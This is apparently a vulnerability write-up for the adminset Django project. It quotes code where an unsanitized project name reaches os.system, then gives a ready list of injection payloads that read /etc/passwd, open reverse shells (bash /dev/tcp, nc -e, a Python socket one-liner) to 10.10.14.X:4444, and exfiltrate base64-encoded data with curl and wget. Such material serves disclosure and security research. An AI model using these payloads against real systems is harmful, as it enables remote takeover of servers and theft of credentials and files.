"""
Vulnerable Code Snippets from adminset
Repository: https://github.com/guohongze/adminset
"""

# =============================================================================
# FILE: delivery/deli.py (lines 89-117)
# VULNERABILITY: OS Command Injection via job_name
# =============================================================================

"""
@login_required()
@permission_verify()
def deploy_action(request, project_id):
    server_list = []
    project = Delivery.objects.get(job_name_id=project_id)
    project.bar_data = 10
    job_name = project.job_name.name  # <-- USER INPUT FROM DATABASE
    source_address = project.job_name.source_address
    app_path = project.job_name.appPath
    source_auth = project.source_auth
    if project.auth:
        auth_info = {"username": project.auth.username,
                     "password": project.auth.password,
                     "deploy_port": project.auth.deploy_port,
                     }
    else:
        auth_info = None
    project.status = True
    project.deploy_num += 1
    project.save()
    sleep(2)

    # VULNERABLE LINES - No sanitization of job_name
    os.system("mkdir -p /var/opt/adminset/workspace/{0}/logs".format(job_name))
    os.system("mkdir -p /var/opt/adminset/workspace/{0}/scripts".format(job_name))

    if app_path == "/":
        return HttpResponse("app deploy destination cannot /")
    # foreign key query need add .all()
    servers = project.serverList.all()
    for server in servers:
        server_ip = str(server.ip)
        server_list.append(server_ip)
    project.bar_data = 15
    rsync_status = project.rsync_delete
    deploy.delay(job_name, server_list, app_path, source_address, project_id, auth_info, rsync_status, source_auth)
    return HttpResponse("ok")
"""

# =============================================================================
# FILE: appconf/models.py
# No validation on 'name' field
# =============================================================================

"""
class Project(models.Model):
    # ... choices definitions ...

    name = models.CharField("Project Name", max_length=50, unique=True, null=False, blank=False)
    # ^^ NO VALIDATION - accepts any characters including shell metacharacters

    description = models.CharField("Project Description", max_length=255, null=True, blank=True)
    language_type = models.CharField("Language Type", choices=LANGUAGE_TYPES, max_length=30, null=True, blank=True)
    # ... other fields ...
"""

# =============================================================================
# FILE: appconf/forms.py
# No input sanitization in form
# =============================================================================

"""
class ProjectForm(forms.ModelForm):

    class Meta:
        model = Project
        exclude = ("id",)

        widgets = {
            'name': TextInput(attrs={'class': 'form-control','style': 'width:450px;'}),
            # ^^ SIMPLE TEXT INPUT - No validation, no sanitization
            # ...
        }
"""

# =============================================================================
# ATTACK VECTORS
# =============================================================================

PAYLOADS = [
    # Command chaining with semicolon
    "project;id",
    "project;whoami",
    "project;cat /etc/passwd",

    # Command substitution
    "project$(id)",
    "project$(whoami)",
    "project`id`",

    # Pipe injection
    "project|id",
    "project|cat /etc/passwd",

    # Reverse shell payloads
    "project;bash -i >& /dev/tcp/10.10.14.X/4444 0>&1",
    "project;nc -e /bin/bash 10.10.14.X 4444",
    "project;python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.X\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

    # Data exfiltration
    "project;curl http://10.10.14.X/$(cat /etc/passwd|base64)",
    "project;wget http://10.10.14.X/?data=$(id|base64)",
]
